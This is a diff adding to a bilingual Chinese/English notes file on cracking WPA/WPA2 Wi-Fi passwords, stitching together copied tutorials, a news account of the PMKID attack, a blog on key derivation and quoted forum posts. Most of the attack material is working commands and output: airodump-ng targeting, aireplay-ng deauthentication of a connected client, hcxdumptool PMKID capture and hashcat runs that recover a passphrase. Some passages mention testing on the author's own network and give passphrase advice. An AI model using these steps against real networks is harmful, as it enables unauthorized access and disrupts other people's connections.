@@ -18,11 +18,21 @@
 ![iwconfig_again](iwconfig_again.png)
 ![ifconfig](ifconfig.png)
 另外,你的无线网卡在启动监听模式以后,网卡接口名称就变成了wlan0mon,以后只要是在aircrack套件中需要指定网卡接口名称的,都要用这个名字,在老版本的aircrack中默认名称是mon0,而新版本则统一变成了wlan0mon
+Monitoring mode allows you to capture packets without being connected to an access point/WiFi router. Also keep in mind the name of your interface will probably change when you turn monitoring mode on. You can confirm this by using ifconfig again. My interface changes to “wlan0mon”.
 2. 扫描附近无线情况
+The next thing you want to do is “listen” with airodump-ng, and note a few pieces of information.
+After running this command you will see a dynamic table of access points/routers. The top of the table should look something like this.
 ,一切准备就绪之后,我们开始尝试扫描附近的无线接入点,找个有客户端在线的再单独监听,一定要注意,”目标无线必须要有客户端在线”,否则是抓不到包的,这也是整个无线破解最核心的地方,因为我们要把对方的某个在线客户端蹬掉线,才能截获他的握手包
 `airodump-ng wlan0mon`
 ![扫描附近网络](扫描附近网络.png)
 我们要测试的wifi名称是YJS，我用我的手机连上去，有设备就好抓握手包了。我们想办法让我的手机掉线，然后再重新连接时抓取握手包，跑包就可以了。
+You will want to find the WiFi network you wish to target under the “ESSID” column. Once you see it you can hit the “ctrl” and “C” keys together on your keyboard to stop listening and freeze what is currently on the screen. The things you want to note from the row that corresponds to your target would be the following:
+
+* BSSID– This is the MAC address of the AP/Router. Copy/paste/write down this elsewhere for now.
+* PWR– If you are too far away from the AP/router you may have a tough time in the next step which is the most important step of all. If PWR = -1 you will have to do some research as to the issues you may come upon. Otherwise -2 through -80ish should be ok. Keep in mind that -2 would mean you have a much better signal than -80. The closer you are to the target AP/router the better chance you have of capturing the 4-way handshake in the next steps. Your options for getting better signal strength would be physically getting closer, or finding a wifi adapter or card that supports longer distances.
+* \#Data– This isn’t super important but I like to pay attention to it. If you see the number under data growing, it’s a good indicator that you will be able to capture the handshake more easily as there are connected clients passing traffic.
+* CH– This is the channel of the network. Copy/paste this elsewhere for now.
+* ENC– For this tutorial you should be testing against a network with “WPA2” listed.
 3. 单独监听目标wifi，准备抓取握手包
 单独监听目标无线热点,注意这里在监听目标无线的过程中不要断开,直到整个抓包过程完成为止,接下来要做的事情就是等待客户端上线,然后进行抓包,例如,下面就表示有一个客户端在线,其实,抓握手包的原理就是先把这个在线的用户给蹬掉线,然后再截获它的握手包,而这个包里就有我们想要的无线密码
  * `airodump-ng --bssid DC:EE:06:96:B7:B8 -c 6 -w sec wlan0mon` 监听目标无线,并把截获到的数据写到指定文件中
@@ -34,8 +44,17 @@
    ![准备抓包](抓包.png)
  * `airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon`
   ![抓取目标连接信息](抓取目标连接信息.png)
+ * `airodump-ng ––bssid  00:00:00:00:00:00 ––channel 11 -w /root/handshakefile -o pcap wlan0mon`
+    Okay, now you have the proper bits of information so you can run airodump again, but this time have it only listen to the network you specify for a 4-way handshake. The 4-way handshake contains the data needed to reverse-engineer the encrypted password. You also tell airodump what to name the output from the captured data.  Replace 00:00:00:00:00:00 with the BSSID you collected in the last step. Replace 11 with CH you collected in the last step. After -w type the path to where you want the handshake capture saved, as well as the name of it (/folder/desired_filename). The “-o pcap” just tells airodump to give us the file in the .cap format which we can use in later steps.
+Now you will see a similar table to the one you saw in the last step, but this time you should notice a few differences. The first difference is that only your target network should show up now. You may also notice an additional table underneath that. It will look similar to this.
+This lower table shows client devices that are connected to your target AP/Router. Ideally you will have a few options to choose from. From this table you want to note a couple of things. Be sure to keep this running for now.
+* PWR– If you have options, you want to go with the client that has a better signal (-35 being much better than -80).
+* Frames– A client with a high frame count is another good option. The higher frame count is usually an indication that wireless traffic is flowing pretty good from the client.
+* STATION – This is the MAC address of the client device. Note this down, in the next step we are going to trick the client into re-negotiating it’s connection with the access point.
+If the network you are listening to is very busy you may not need to do this next step at all. Essentially at this point as mentioned before we are waiting to snag a copy of the 4-way handshake which happens when a client authenticates to an AP/router. Sometimes this will be captured simply by listening for long enough. On a very busy network, this may happen within a few minutes or faster. If you get a handshake before completing the next step with “aireplay” you can skip it and move on to “Step 2: Prep the .cap for Hashcat”.
 ???fixed channel always changing???
 4. 使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包(用minidwep-gtk长时间一般也可以抓到包）
+For this example let’s say you are on a network that’s not very busy, and devices typically stay connected to the wireless network for days at a time or longer. Instead of waiting for an undetermined amount of time for a connection to happen so we can capture it, we can force it to happen (usually). So let’s go ahead and do that. We are going to “DEAUTH” the client we noted in the last step (STATION) using aireplay.
 ??? `aireplay` and `mdk3` will cause ubuntu crash, or the `airodump-ng` causes it.???
 发现客户端在线稳定后,就可以向目标发射’ddos’流量了,直到我们在监听的终端下看到有握手包出现为止,如果第一轮包发完成后,并没看到握手包,别着急,先等个几十秒,或者隔个五六秒再发一次即可,正常情况下,基本一次就能搞定
 通过aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。
@@ -58,9 +77,25 @@
      ![aireplay-ng](aireplay-ng.png)
      可以看到,这时握手包已被正常抓获,此时监听也就可以断开了,注意观察终端的右上角,那个带有handshake标志的就是握手包的意思
      ![got handshake](got_handshake.png)
+ * `aireplay-ng -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 ––deauth 1 wlan0mon`
+     Keep the airodump window running in the background and open a new terminal. Type the following. Replace 00:00:00:00:00:00 with the BSSID and replace 11:11:11:11:11:11 with the MAC address you collected from STATION in the last step.
+
+What you want to do now is watch for 2 things.
+* In the aireplay window you will get some responses from your command. The information you want to see from the response is the ACK’s. You want the number in front of the “|” to be higher than 0. This will indicate the client received your deauth packets. If you get 0, try sending the command again.
+    * Good
+        ![success_ACKs](success_ACKs.png)
+    * Bad
+        ![failed_ACKs](failed_ACKs.png)
+* In the airodump window you are looking for confirmation that a handshake was captured. You will most likely see the STATION disappear after you send the deauth. When it shows back up, odds are a handshake will be captured. It should show up on the top line furthest to the right when you do capture it.
+    ![airodump_handshake](airodump_handshake.png)
+* Other things you can try are deauth a different client/STATION or keep waiting for a new connection to happen. I’ve had situations where the handshake was captured in seconds, and other times where it took closer to an hour of waiting for STATIONS to show up while I sent deauths, and/or waited for a handshake to come in….. hypothetically that is…. =)
+Once you ensure you have the .cap file where you told airdump to put it (directory and filename you configured with the “-w” option) you can close airodump and aireplay.
 5. 抓包成功后ctrl+C即可结束抓包。
 停止监听模式
 `airmon-ng stop wlan0mon`
+#### SSID, BSSID and ESSID
+[Understanding the Network Terms SSID, BSSID, and ESSID](https://www.juniper.net/documentation/en_US/junos-space-apps/network-director2.0/topics/concept/wireless-ssid-bssid-essid.html)
+[Differences between BSSID, ESSID and SSID](https://www.cwnp.com/forums/posts?postNum=288444)
 ### 二. 把cap转换成hccap
 * 用aircrack-ng
 `aircrack-ng <out.cap> -J <out.hccap>`
@@ -92,6 +127,24 @@
 破解的结果：
 ![破解结果](破解结果.png)
 ## A new attack on WPA/WPA2 using PMKID
+A new technique has been discovered to easily retrieve the Pairwise Master Key Identifier (PMKID) from a router using WPA/WPA2 security, which can then be used to crack the wireless password of the router. While previous WPA/WPA2 cracking methods required an attacker to wait for a user to login to a wireless network and capture a full authentication handshake, this new method only requires a single frame which the attacker can request from the AP because it is a regular part of the protocol.
+This new method was discovered by Jens "atom" Steube, the developer of the popular Hashcat password cracking tool, when looking for new ways to crack the WPA3 wireless security protocol. According to Steube, this method will work against almost all routers utilizing 802.11i/p/q/r networks with roaming enabled.
+This method works by extracting the RSN IE (Robust Security Network Information Element) from a single EAPOL frame. The RSN IE is a optional field that contains the Pairwise Master Key Identifier (PMKID) generated by a router when a user tries to authenticate.
+The PMK is part of the normal 4-way handshake that is used to confirm that both the router and client know the Pre-Shared Key (PSK), or wireless password, of the network. It is generated using the following formula on both the AP and the connecting client:
+"The PMKID is computed by using HMAC-SHA1 where the key is the PMK and the data part is the concatenation of a fixed string label "PMK Name", the access point's MAC address and the station's MAC address." stated Steube's post on this new method.
+`PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)`
+![rsn_field_with_pmkid](rsn_pmkid.jpg)
+Previous WPA/WPA2 crackers required an attacker to patiently wait while listening in on a wireless network until a user successfully logged in. They could then capture the four-way handshake in order to crack the key.
+"With any previous attacks on WPA an attacker has to be in a physical position that allows them to record the authentication frames from both the access point and the client (the user)," Steube told BleepingComputer. "The attacker also has to wait for a user to login to the network and have a tool running in that exact moment to dump the handshake to disk."
+Now an attacker simply has to attempt to authenticate to the wireless network in order to retrieve a single frame in order to get access to the PMKID, which can then be cracked to retrieve the Pre-Shared Key (PSK) of the wireless network.
+It should be noted that this method does not make it easier to crack the password for a wireless network. It instead makes the process of acquiring a hash that can can be attacked to get the wireless password much easier.
+While Steube's new method makes it much easier to access a hash that contains the pre-shared key that hash still needs to be cracked. This process can still take a long time depending on the complexity of the password.
+Unfortunately, many users do not know how to change their wireless password and simply use the PSK generated by their router. 
+"In fact, many users don't have the technical knowledge to change the PSK on their routers," Steube told BleepingComputer. "They continue to use the manufacturer generated PSK and this makes attacking WPA feasible on a large group of WPA users."
+As certain manufacturers create a PSK from a pattern that can easily be determined, it can be fed into a program like Hashcat to make it easier to crack the wireless password.
+"Cracking PSKs is made easier by some manufacturers creating PSKs that follow an obvious pattern that can be mapped directly to the make of the routers. In addition, the AP mac address and the pattern of the ESSID  allows an attacker to know the AP manufacturer without having physical access to it," Steube continued to tell us via email.  "Attackers have collected the pattern used by the manufacturers and have created generators for each of them, which can then be fed into hashcat. Some manufacturers use pattern that are too large to search but others do not. The faster your hardware is, the faster you can search through such a keyspace. A typical manufacturers PSK of length 10 takes 8 days to crack (on a 4 GPU box)."
+
+In this short blog, I will walk you through the process of obtaining a valid PMKID packet, and converting those frames of data to hashcat format for cracking. This is a new way to recover the WPA2-PSK passphrases from vulnerable devices, that doesn’t require station <->client interaction or a 4-way handshake.
 In this writeup, I'll describe a new technique to crack WPA PSK (Pre-Shared Key) passwords.
 In order to make use of this new attack you need the following tools:
 * [hcxdumptool v4.2.0 or higher](https://github.com/ZerBea/hcxdumptool)
@@ -108,6 +161,175 @@ The main advantages of this attack are as follow:
 * No more lost EAPOL frames when the regular user or the AP is too far away from the attacker
 * No more fixing of nonce and replaycounter values required (resulting in slightly higher speeds)
 * No more special output format (pcap, hccapx, etc.) - final data will appear as regular hex encoded string
+### [Understanding](https://www.ins1gn1a.com/understanding-wpa-psk-cracking/)
+#### Intro
+The few weaknesses inherent within the authentication handshake process for WPA/WPA2 PSKs have been known for a long time. This blog post does not serve anything that is new or has not been previously seen in the wild or conference talks and actually references other sites (such as RFCs) that can supply further information. It does, however, provide some clarity in to what is actually performed during the authentication and thus cracking process, but was mainly an exercise for me to learn how everything works at a lower level. Perhaps it will be useful to someone else in the same scenario.
+#### Overview
+During the authentication process the supplicant (client) and authenticator (access point) each attempt to prove that they independently know the pre-shared-key (PSK) passphrase without disclosing the key directly. This is done by each encrypting a message using the Pairwise-Master-Key (PMK) that they have generated, transmitting each way, and then decrypting the message they've each received. The four-way handshake is used to establish a new key called the Pairwise-Transient-Key (PTK), which is comprised of the following concatenated data:
+* Pairwise Master Key
+* Authenticator Nonce
+* Supplicant Nonce
+* Authenticator MAC Address
+* Supplicant MAC Address
+The result is then processed through a Pseudo-Random-Function (PRF). Another key that is used for decrypting multicast traffic, named the Group-Temporal-Key, is also created during this handshake process.
+#### Actual Handshake Process
+* Initially the access point transmits an ANonce key to the client within the first handshake packet.
+* The client then constructs its SNonce, along with the Pairwise-Transient-Key (PTK), and then submits the SNonce and Message Integrity Code (MIC) to the access point. (At this point an attacker would have been able to intercept enough of the handshake to perform a password cracking attack.)
+* Next the access point constructs the Group-Temporal-Key, a sequence number that is used to detect replay attacks on the client, and a Message Integrity Code (MIC).
+* Lastly the client then sends an acknowledgement (ACK) to the access point.
+#### Construction of the PMK
+Pairwise-Master-Keys are used during the creation of the Pairwise-Transient-Keys and are never actually transmitted across the network. They are derived from the Pre-Shared-Keys (Enterprise WiFi uses a key created by EAP, but that is out of scope for this article) along with the other information such as SSID, SSID Length. The PMKs are created using the Password-Based Key Derivation Function #2 (PBKDF2), with the SHA1 hashing function used with HMAC as the message authentication code.:
+`PMK = PBKDF2(HMAC−SHA1, PSK, SSID, 4096, 256)`
+HMAC-SHA1 is the Pseudo Random Function used, whilst 4096 iterations of this function are used to create the 256 bit PMK. The SSID is used as a salt for the resulting key, and of course the PSK (passphrase in this instance) is used as the basis for this entire process.
+The HMAC function used:
+`H(K XOR opad, H(K XOR ipad, passphrase))`
+Further information on HMAC-SHA1 from RFC2104 can be seen below, but is out of my depth:
+
+        opad = 0x5C * B
+        ipad = 0x36 * B
+        (1) append zeros to the end of K to create a B byte string (e.g., if K is of length 20 bytes and B=64, then K will be appended with 44 zero bytes 0x00)
+        (2) XOR (bitwise exclusive-OR) the B byte string computed in step (1) with ipad
+        (3) append the stream of data 'text' to the B byte string resulting from step (2)
+        (4) apply H to the stream generated in step (3)
+        (5) XOR (bitwise exclusive-OR) the B byte string computed in step (1) with opad
+        (6) append the H result from step (4) to the B byte string resulting from step (5)
+        (7) apply H to the stream generated in step (6) and output the result
+Here is a simple Python script that can be used to compute the raw key from the SSID and PSK passphrase. Within the Python module I've used (can be installed via python-pip) the default MAC and hash algorithm is HMAC-SHA1:
+
+        #! /usr/bin/env python
+        from pbkdf2 import PBKDF2
+        
+        ssid = raw_input('SSID: ')
+        passphrase = raw_input('Passphrase: ')
+        
+        print ("Pairwise Master Key: " + PBKDF2(passphrase, ssid, 4096).read(32).encode("hex"))
+#### Construction of the PTK
+The creation of the Pairwise-Transient-Keys is performed via a another PRF (using an odd combination of SHA1, ending in a 512 bit string), which uses a combination of the PMK, AP MAC Address, Client MAC Address, AP Nonce, Client Nonce. The result is this 512 bit Pairwise-Transient-Key, which is actually a concatenation of five separate keys and values, each with their own purpose and use:
+
+* Key Confirmation Key (KCK) - Used during the creation of the Message Integrity Code.
+* Key Encryption Key (KEK) - Used by the access point during data encryption.
+* Temporal Key (TK) - Used for the encryption and decryption of unicast packets.
+* MIC Authenticator Tx Key (MIC Tx) - Only used with TKIP configurations for unicast packets sent by access points.
+* MIC Authenticator Rx Key (MIC Rx) - Only used with TKIP configurations for unicast packets sent by clients.
+The resulting order:
+
+        - 128 bits -.- 128 bits -.- 128 bits -.- 64 bits -.- 64 bits -
+        |    KCK    |     KEK    |     TK     |  MIC Tx   |   MIC Rx  |
+The only reference to a usable PRF512 function within Python was an excerpt of code from a question on Stack Overflow from back in 2012:
+
+        def customPRF512(key,A,B):
+            blen = 64
+            i    = 0
+            R    = ''
+            while i<=((blen*8+159)/160):
+                hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
+                i+=1
+                R = R+hmacsha1.digest()
+            return R[:blen]
+Some sample code just to get a visualisation of what happens in the background:
+
+        #! /usr/bin/env python
+        
+        import hmac,hashlib,binascii,sha
+        from pbkdf2 import PBKDF2
+        
+        def customPRF512(key,A,B):
+            blen = 64
+            i    = 0
+            R    = ''
+            while i<=((blen*8+159)/160):
+                hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
+                i+=1
+                R = R+hmacsha1.digest()
+            return R[:blen]
+        
+        ssid = raw_input('SSID: ')
+        passphrase = raw_input('Passphrase: ')
+        ap_mac = binascii.a2b_hex(raw_input("AP MAC: "))
+        s_mac = binascii.a2b_hex(raw_input("Client MAC: "))
+        anonce = binascii.a2b_hex(raw_input("ANonce: "))
+        snonce = binascii.a2b_hex(raw_input("SNonce: "))
+        
+        key_data = min(ap_mac,s_mac) + max(ap_mac,s_mac) + min(anonce,snonce) + max(anonce,snonce)
+        pke = "Pairwise key expansion"
+        key_data = min(ap_mac,s_mac) + max(ap_mac,s_mac) + min(anonce,snonce) + max(anonce,snonce)
+        
+        pmk = PBKDF2(passphrase, ssid, 4096).read(32)
+        ptk = customPRF512(pmk,pke,key_data).encode('hex')
+        
+        print ("\nPMKey: " + pmk)
+        print ("PTKey: " + ptk)
+        print ("KCK: " + ptk[0:16])
+The PMK and PTK are then printed to the terminal, with the first 16 bytes of the PTK being the KCK.
+#### What is actually computed for cracking?
+#### Conclusions
+If anything, knowing the amount of computation that is performed for each attempt at comparing the MICs puts me at somewhat ease regarding the security of using PSK auth on personal networks, however it does prove how invaluable random passphrases are within various cryptographic implementations such as this, especially passphrases that are longer and contain more entropy. Use a 15 character passphrase for your PSK, which includes a combination of upper and lower alpha, numeric, and special characters, which isn't a dictionary word. Oh, and also change it regularly. If I or anyone else happen to crack your passphrase, then an attacker wouldn't get much use of it is void should they go back there in a months time can't connect because it's changed to a new value.
+More importantly, don't use PSK authentication for your corporate networks. Whilst there are some vulnerabilities within certain EAP configurations they are a lot easier to squash than an offline attack such as what is capable against PSKs.
+If any of the aforementioned information is incorrect please feel free to drop me an email and I'll make the necessary amendments and credit appropriately.
+### Supported adapters (strict)
+* USB ID 148f:7601 Ralink Technology, Corp. MT7601U Wireless Adapter
+* USB ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter
+* USB ID 148f:5370 Ralink Technology, Corp. RT5370 Wireless Adapter
+* USB ID 0bda:8187 Realtek Semiconductor Corp. RTL8187 Wireless Adapter
+* USB ID 0bda:8189 Realtek Semiconductor Corp. RTL8187B Wireless 802.11g 54Mbps Network Adapter
+Out of all the cards mentioned, in my preliminary testing I found the older AWUS036H card I bought in 2012 to work the best.
+![AWUS036H](AWUS036H.jpg)
+![AWUS036NH](AWUS036NH.jpeg)
+Both Alfa USB devices work well. Preliminary results show better performance, with the AWUS036H . I was able to obtain multiple PKMID frames within seconds sometimes from a vulnerable access point . The older Alfa AWUS036H is a also a more powerful card and works better with nosier conditions.
+
+        root@ubuntu:~# lsusb
+        --- snip ---
+        Bus 003 Device 016: ID 0bda:8187 Realtek Semiconductor Corp. RTL8187 Wireless Adapter
+        
+        --- snip ---
+Walk-through:
+
+        # ip link set wlx00c0ca59f4b2 down
+        # iw dev wlx00c0ca59f4b2 set type monitor
+        # rfkill unblock all
+        # ip link set wlx00c0ca59f4b2 up
+        ./hcxdumptool -i wlx00c0ca694df2 --enable_status -c 6 -o E4200-WPA2PSK.pcapng
+        --
+        [15:18:14 - 006] c0c1c04bfc68 -> e4209b5662d3 [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT 3605]
+        [15:18:16 - 006] c0c1c04bfc68 -> fcc2330136c6 [FOUND PMKID]
+        --
+        # ./hcxpcaptool -z E4200-WPA2PSK.16800 E4200-WPA2PSK.pcapng                                                                                                       
+        start reading from E4200-WPA2PSK.pcapng                                                                                                                                                 
+                                                                                                                                                                                                               
+        summary:                                                                                                                                                                                               
+        --------                                                                                                                                                                                               
+        file name....................: E4200-WPA2PSK.pcapng                                                                                                                                                    
+        file type....................: pcapng 1.0                                                                                                                                                              
+        file hardware information....: x86_64                                                                                                                                                                  
+        file os information..........: Linux 4.13.0-46-generic                                                                                                                                                 
+        file application information.: hcxdumptool 4.2.0                                                                                                                                                       
+        network type.................: DLT_IEEE802_11_RADIO (127)                                                                                                                                              
+        endianess....................: little endian
+        file os information..........: Linux 4.13.0-46-generic
+        file application information.: hcxdumptool 4.2.0
+        network type.................: DLT_IEEE802_11_RADIO (127)
+        endianess....................: little endian
+        read errors..................: flawless
+        packets inside...............: 129
+        skipped packets..............: 0
+        packets with FCS.............: 67
+        beacons (with ESSID inside)..: 2
+        probe requests...............: 2
+        probe responses..............: 4
+        association requests.........: 13
+        association responses........: 26
+        authentications (OPEN SYSTEM): 70
+        authentications (BROADCOM)...: 14
+        EAPOL packets................: 12
+        EAPOL PMKIDs.................: 1
+        best handshakes..............: 1 (ap-less: 0)
+Results:
+
+        1 PMKID(s) written to E4200-WPA2PSK.16800
+        # cat E4200-WPA2PSK.16800 
+        b0b606458a7945cf7c80b7fefe390506*c0c1c04bfc68*fcc2330136c6*436973636f3136383934
+Details to be noted:
+Ensure you specify the correct channel when passing that value to “-c” to the Access Point you are targeting.
 ### Attack details
 The RSN IE is an optional field that can be found in 802.11 management frames. One of the RSN capabilities is the PMKID.
 ![One of the RSN capabilities is the PMKID](wireshark_pmkid.png)
@@ -137,6 +359,82 @@ IF an AP receives our association request packet and supports sending PMKID we w
         [13:29:57-011]4604ba734d4e->89acf0e761f4[ASSOCIATIONRESPONSE,SEQUENCE 1206]
         [13:29:57-011]4604ba734d4e->89acf0e641f4[FOUND PMKID]
 Note: Based on the noise on the wifi channel it can take some time to receive the PMKID. We recommend running hcxdumptool up to 10 minutes before aborting.
+
+Quote:
+> When trying to target a specific AP (making sure I only hit mine, not my neighbors), I'm trying to use `--filtermode=2` and `--filterlist=filter.txt`. `filter.txt` consists of a single line containing my AP's address in the form "05D2BA2B8CD". This consistently returns segmentation fault. Remove just the `--filterlist` and everything appears to work fine, though I'm not sure how `filtermode=2` works with no list, but it runs.
+> The exact line is:
+> `root@notka1i:~/Desktop/PMKID# hcxdumptool -o test.pcapng -i wlan0 --enable_status --filtermode=2 --filterlist=filter.txt`
+> I've tried several variants (e.g. `--filterlist` `./filter.txt`, full path, etc.) with the same results.
+> did you ever get this to work with the --filterlist=<text file> ? I have been playing around with this and I discovered that if you remove the quotes in your text file, you can use the filter option without any issue. thought I would update if anyone else has run into this issue using the --filterlist option.
+
+Quote:
+> So far, nothing but goose eggs (no success yet). I've used three separate routers (Linksys WRT54GL, Netgear Nighthawk R7000, and Belkin N450). All configured with WPA2, no clients attached.
+> I've used two separate adapters (Panda PAU09 148f:5572, and Alfa AWUS 051NH v2 148f:3572) against all previously mentioned APs.
+> Here's the syntax I used:
+> `hcxdumptool -o output.pcapng -i wlan0 -t 5 --enable_status --filterlist=test.txt --filtermode=2`
+> `test.txt` was the file containing the BSSID of the AP (colons removed)
+> I'll keep testing with a few more adapters and routers and post once I've got something worth posting!
+
+Quote:
+
+> Very nice work. Figured I'd bring scapy into play and make this a lot easier to work with. Weaponized script is up at:
+> https://github.com/stryngs/scripts/tree/...id2hashcat
+
+Quote:
+> Hi,
+> first of all, congratulations to your work - nice job.
+> Especially, because the attack is so simple, I'm wondering why nobody discovered it earlier Smile
+> Mostly for me, I'm writing a short summary of the stuff here:
+> http://netgab.net/web/2018/08/08/yawa-ye...-analysis/
+> However, regarding the question whether "my device is affected" or not:
+> I guess, consumer grade hardware won't be attackable using this tool, because these simply do not perform PMKID caching (i guess). I did a quick test using an AVM Fritz!Box (popular model in Germany). There is no PMKID in the first message of the 4-way handshake.
+> => Therefore, it is not vulnerable, right?!
+> However, I tested it as well using enterprise grade equipment (Cisco). The PMKID is included in the first EAPoL message of the 4 way handshake.
+> Maybe this is a silly question, but does PMKID including make sense for WPA2 PERSONAL networks?
+> In my opinion no, because there is no functional benefit (except with 802.11r FT).
+> PMKID caching makes sense for WPA2 Enterprise (802.1X) networks. However, as you outlined, the attack does not work for these WLANs. The reason is, that the PMK is dynamically derived per user per session and is a random value, not included in any dictionary (at least I'm sure for all TLS based EAP methods like EAP-TLS, PEAP, EAP-TTLS etc.).
+> So, the combination PMKID caching and PSK networks does not makes sense (right?). However, some vendors might send the PMKID anyways. Despite of the fact, that the playrules for a WPA2 PSK network doesn't change because of the new attack, the mitigation for a vendor is pretty simple:
+> => Disable sending of PMKIDs for PSK network (because it does not make sense, right).
+> The only thing that remains open is the combination of PSK networks with 802.11r FT - because there is a (small) functional benefit (2 messages instead of 6 during the roaming event).
+
+Quote:
+> Limitations:
+> This attack will not work on dynamic calculated PMKs.
+> You can identify them in your hash file:
+> MAC_AP, MAC_STA and ESSID are the same, PMKID changed.
+> In that case an EAPOL 4/4 handshake is also useless.
+
+Quote:
+> For those who have a chipset that is not supported by the hashcat tools, it is very easy to get the PMKID with wpa_supplicant itself 
+> It takes a couple of seconds to get the PMKID
+> ![wpa_suppliant](wpa_suppliant.png)
+
+Quote:
+> Meant to post this earlier to see if anyone else is experiencing this. I’m using a ThinkPad with The-Distribution-Which-Does-Not-Handle-OpenCL-Well (Kali) and the built in WiFi chipset intel 8260. When I run hcxdumptool either with or without a specific channel it seems to spit out a few notifications, associations and stuff, but then appears to “get stuck” and the terminal really doesn’t say much else. Now if I open another window and run Airodump wlan0mon (its scanning) the terminal window running hcxdumptool starts spitting out all kinds of info and captures handshacks, multiple pmkids etc.
+> What do you all typically do? Run hcxdumptool locked on one channel or allow it to scan? Seems strange, but it my case I always have faster results when Airodump is running in another window.
+
+Quote:
+> Note: Since v4.2.1, hxcdumptool --enable_status requires a parameter. 1 is the number you are looking for. You might want to +2 if you want to see which AP is which.
+
+Quote:
+> hcxdumptool is able to run different attack vectors. And the client-less (PMKID) attack vector is only one of them:
+> ap-less:
+> Only one packet (M2) from a client required. You do not need to hunt for access points. Just wait until the clients come to you. Have patience - some clients will give you their PSK in the clear (hcxpcaptool -E -I -U)!
+> This attack vector is the most important one, because clients are weak! Try to annoy them!
+> You can run --nonce-error-corrections=0 on that handshake!
+> client-less:
+> Only one packet (M1 - PMKID) from an access point is required.
+> You have to hunt for access points (usually access points don't move). It's hard to annoy an access point.
+> You need to have a good antenna (high gain)!
+> m4 - retry:
+> After receipt of a single M4, M1, M2, M3 are requested as long as we didn't successfull captured an authorized handshake (M2/M3).
+> A client and an access point are required for this attack vector! You need to have a good antenna!
+> deauthentication (old school):
+> Disconnect a client from the network and capture the following authentication.
+> A client and an access point are required for this attack vector!
+> You need to have a good antenna (high gain)!
+> Attack vector will not work if PMF is enabled
+
 #### 2. Run hcxpcaptool to convert the captured data from pcapng format to a hash format accepted by hashcat.
 `$ ./hcxpcaptool -z test.16800 test.pcapng`
 
@@ -182,6 +480,61 @@ Note: While note required it is recommended to use options `-E -I` and `-U` with
 * `-U` retrieve usernames from WiFi-traffic
 `$ ./hcxpcaptool -E essidlist -I identitylist -U usernamelsit -z test.16800 test.pcang`
 #### 3. Run hashcat to crack it.
+We can download the newly updated https://hashcat.net/hashcat/ V4.2.0 which cracks two new hash types:
+WPA-PMKID-PBKDF2
+WPA-PMKID-PMK
+The files have been copied to a windows host and “cracked” below for illustration purposes only. Since it’s a single hex encoded string, it’s much easier to copy and mange between different hosts.
+![hashcat_PMKID_test](hashcat_PMKID_test.png)
+
+        c:\Users\Adam\Downloads\hashcat-4.2.0>hashcat64.exe -m 16800 E4200-WPA2PSK.16800 wordlist.txt
+        hashcat (v4.2.0) starting…
+        ======================================
+        * Device #1: GeForce GTX 1080, 2048/8192 MB allocatable, 20MCU
+        OpenCL Platform #2: Intel(R) Corporation
+        ========================================
+        * Device #2: Intel(R) Core(TM) i7–6800K CPU @ 3.40GHz, skipped.
+        Hashes: 1 digests; 1 unique digests, 1 unique salts
+        Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+        Rules: 1
+        Applicable optimizers:
+        * Zero-Byte
+        * Single-Hash
+        * Single-Salt
+        * Slow-Hash-SIMD-LOOP
+        Minimum password length supported by kernel: 8
+        Maximum password length supported by kernel: 63
+        Watchdog: Temperature abort trigger set to 90c
+        Dictionary cache built:
+        * Filename..: wordlist.txt
+        * Passwords.: 3
+        * Bytes…..: 29
+        * Keyspace..: 3
+        * Runtime…: 0 secs
+        The wordlist or mask that you are using is too small.
+        This means that hashcat cannot use the full parallel power of your device(s).
+        Unless you supply more work, your cracking speed will drop.
+        For tips on supplying more work, see: https://hashcat.net/faq/morework
+        Approaching final keyspace — workload adjusted.
+        b0b606458a7945cf7c80b7fefe390506*c0c1c04bfc68*fcc2330136c6*436973636f3136383934:testpassw0rd
+        Session……….: hashcat
+        Status………..: Cracked
+        Hash.Type……..: WPA-PMKID-PBKDF2
+        Hash.Target……: b0b606458a7945cf7c80b7fefe390506*c0c1c04bfc68*fcc23…383934
+        Time.Started…..: Mon Aug 06 18:32:57 2018 (0 secs)
+        Time.Estimated…: Mon Aug 06 18:32:57 2018 (0 secs)
+        Guess.Base…….: File (wordlist.txt)
+        Guess.Queue……: 1/1 (100.00%)
+        Speed.Dev.#1…..: 44 H/s (0.10ms) @ Accel:32 Loops:16 Thr:1024 Vec:1
+        Recovered……..: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+        Progress………: 3/3 (100.00%)
+        Rejected………: 1/3 (33.33%)
+        Restore.Point….: 0/3 (0.00%)
+        Candidates.#1….: passw0rd -> testpassw0rd
+        HWMon.Dev.#1…..: Temp: 44c Fan: 28% Util: 31% Core:1771MHz Mem:4513MHz Bus:16
+        Started: Mon Aug 06 18:32:54 2018
+        Stopped: Mon Aug 06 18:32:58 2018
+        c:\Users\Adam\Downloads\hashcat-4.2.0>type hashcat.potfile
+        b0b606458a7945cf7c80b7fefe390506*c0c1c04bfc68*fcc2330136c6*436973636f3136383934:testpassw0rd
 Bassically we can attack this hash as any other hash type. The hash-mode that we need to use is 16800.
 `$ ./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'`
 
@@ -241,7 +594,7 @@ Output:
         Started: Thu Jul 26 12:51:30 2018
         Stopped: Thu Jul 26 12:52:21 2018
 
-## Cracking using the Pre-computed PMKs
+## [Cracking using the Pre-computed PMKs](https://rootsh3ll.com/rwsps-speeding-wpa2-psk-cracking-using-pre-generated-pmks-ch5pt1/)
 ???There's also support for hash-mode 16801, which allows skipping the computation of the PMK - which is the computation that makes cracking WPA so slow. Pre-computing PMK can be useful in cases where you are on site and you cannot transfer a hash to a remote cracking rig because of an NDA. The goal is to run hashcat on your notebook which you can bring to the site.
